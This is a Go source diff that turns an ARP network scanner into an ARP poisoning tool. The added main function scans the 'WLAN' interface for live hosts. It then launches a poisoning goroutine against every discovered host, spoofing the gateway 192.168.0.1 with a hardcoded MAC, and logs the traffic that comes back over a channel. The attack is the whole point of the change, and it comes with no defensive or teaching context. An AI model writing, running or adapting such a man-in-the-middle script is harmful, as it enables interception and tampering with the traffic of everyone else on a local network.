@@ -1,62 +1,64 @@
 package main
 
 import (
-	"encoding/hex"
+	"ARTScript_ARP/arpPosion"
+	"ARTScript_ARP/arpScanX"
+	"ARTScript_ARP/arpScanX/arp"
+	"ARTScript_ARP/globalChan"
+	"errors"
+	"github.com/withmandala/go-log"
 	"os"
-	"strings"
 	"time"
-
-	"github.com/HayatoDoi/arp-scan-X/arp"
-	"github.com/HayatoDoi/arp-scan-X/syslog"
 )
 
 //go:generate oui -p main -o oui.go
 
+var liveTables arp.ArpTables
+var channel chan string = make(chan string)
+
 func main() {
-
+	// Setup
+	logger := log.New(os.Stderr).WithColor()
 	Set_opts()
-	slog := syslog.New(opts.DebugMode)
+	opts.DebugMode = false
+	opts.InterfaceName = "WLAN"
 
-	interfaces, err := arp.IfaceToName("WLAN")
+	// getInterfaceInfo
+	localIP, localMac := getLocalInfo("WLAN")
+	device, liveTables := arpScanX.Start_arpScan(opts.DebugMode, opts.InterfaceName, opts.Timeout, opts.Backoff)
+
+	logger.Infof("Start arpPosion...")
+	for _, arpTable := range liveTables {
+		go arpPosion.Start_posion(device.IfaceID,
+			"192.168.0.1",
+			"80:ea:07:62:72:d6",
+			localIP, localMac,
+			arpTable.IP,
+			arpTable.HardwareAddr)
+	}
+	for {
+		logger.Info(RecvFromChannel())
+	}
+}
+
+func RecvFromChannel() string {
+	logger := log.New(os.Stderr).WithColor()
+	abChan := globalChan.GetABGlobalChanString()
+
+	data, err := ReadChanNonBlock(abChan)
 	if err != nil {
-		slog.Errorln("%s", err)
-
-		os.Exit(1)
+		logger.Error(err)
 	}
+	return data
+}
 
-	success := false
-	for _, interface_ := range interfaces {
-		// make config
-		config := arp.Config{
-			Interface: interface_,
-			//Timeout:   time.Duration(500) * time.Millisecond,
-			Timeout: time.Duration(opts.Timeout) * time.Millisecond,
-			//Backoff: 1.5,
-			Backoff: opts.Backoff,
-		}
-		a, err := arp.New(config)
-		if err != nil {
-			slog.Debugln("Error(%s) : %s", interface_, err)
-			continue
-		}
-		slog.Println("Interface: %s, Network range: %v", interface_, a.Addr)
-		arpTables, err := a.Scan()
-		if err != nil {
-			slog.Debugln("Error(%s) : %s", interface_, err)
-			continue
-		}
-		for _, arpTable := range arpTables {
-			oui := strings.ToUpper(hex.EncodeToString(arpTable.HardwareAddr[:3]))
-			organization, ok := MacAndOrganization[oui]
-			if ok != true {
-				organization = "unknown"
-			}
-			slog.Println("%-15v %-20v %s", arpTable.IP, arpTable.HardwareAddr, organization)
-		}
-		success = true
-	}
-	if success == false {
-		slog.Errorln("No valid ip address configuration.")
-		os.Exit(1)
+func ReadChanNonBlock(ch chan string) (string, error) {
+	timeout := time.NewTimer(time.Second * time.Duration(2))
+
+	select {
+	case temp := <-ch:
+		return temp, nil
+	case <-timeout.C:
+		return "", errors.New("read time out")
 	}
 }
